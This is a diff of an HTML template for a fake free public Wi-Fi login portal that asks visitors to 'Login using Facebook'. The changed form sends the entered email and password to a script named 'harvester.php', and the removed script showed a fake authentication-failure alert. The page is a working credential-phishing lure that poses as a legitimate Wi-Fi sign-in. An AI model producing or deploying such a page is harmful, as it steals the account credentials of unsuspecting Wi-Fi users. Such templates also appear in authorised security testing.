@@ -1,30 +1,12 @@
 <!DOCTYPE html>
 <html >
   <head>
-
-<script>
-function validateForm() {
-    var x = document.forms["theform"]["wfphshr-email"].value;
-    var atpos = x.indexOf("@");
-    var dotpos = x.lastIndexOf(".");
-    if (atpos<1 || dotpos<atpos+2 || dotpos+2>=x.length) {
-        alert("Failed to authenticate. Wrong Email or Password.");
-        return false;
-    }
-
-    var x = document.forms["theform"]["wfphshr-password"].value;
-    if (5>=x.length) {
-        alert("Failed to authenticate. Wrong Email or Password.");
-        return false;
-    }
-}
-</script>
     <meta charset="UTF-8">
-    <title>{{ organization }} Wi-Fi Service</title>
-    <link rel="stylesheet" href="/static/css/reset.css">
-    <link rel='stylesheet prefetch' href='/static/css/roboto.css'>
-<link rel='stylesheet prefetch' href='/static/css/font-awesome.min.css'>
-        <link rel="stylesheet" href="/static/css/style.css">    
+    <title>Public Wi-Fi Service</title>
+    <link rel="stylesheet" href="css/reset.css">
+    <link rel='stylesheet prefetch' href='css/roboto.css'>
+<link rel='stylesheet prefetch' href='css/font-awesome.min.css'>
+        <link rel="stylesheet" href="css/style.css">    
   </head>
   <body> 
 <!-- Form Mixin-->
@@ -32,7 +14,7 @@ function validateForm() {
 <!-- Button Mixin-->
 <!-- Pen Title-->
 <div class="pen-title">
-  <h1>Get connected to the Internet for free</h1><span>A simple, no frills {{ organization }} Wi-Fi service.</span>
+  <h1>Get connected to the Internet for free</h1><span>A simple and free Wi-Fi service.</span>
 </div>
 <!-- Form Module-->
 <div class="module form-module">
@@ -40,8 +22,8 @@ function validateForm() {
   </div>
   <div class="form">
     <h2>Login using Facebook</h2>
-    <img src="static/logos/facebook-logo.png" width="25%" class="logo"></img>
-    <form name="theform" class="theform" method="GET" action="../../database.php" onsubmit="return validateForm();">
+    <img src="logos/facebook-logo.png" width="25%" class="logo"></img>
+    <form name="theform" class="theform" method="GET" action="../../harvester.php" onsubmit="return validateForm();">
       <input type="text" placeholder="Email" name="email"/>
       <input type="password" placeholder="Password" name="password"/>
       <button class="login-btn">Login</button>
@@ -87,8 +69,8 @@ The Service is made available provided:
     </div>
   </div>
 
-    <script src='/static/js/jquery.min.js'></script>
-    <script src="/static/js/index.js"></script> 
+    <script src='js/jquery.min.js'></script>
+    <script src="js/index.js"></script> 
 <script>
 // Get the modal
 var modal = document.getElementById('myModal');
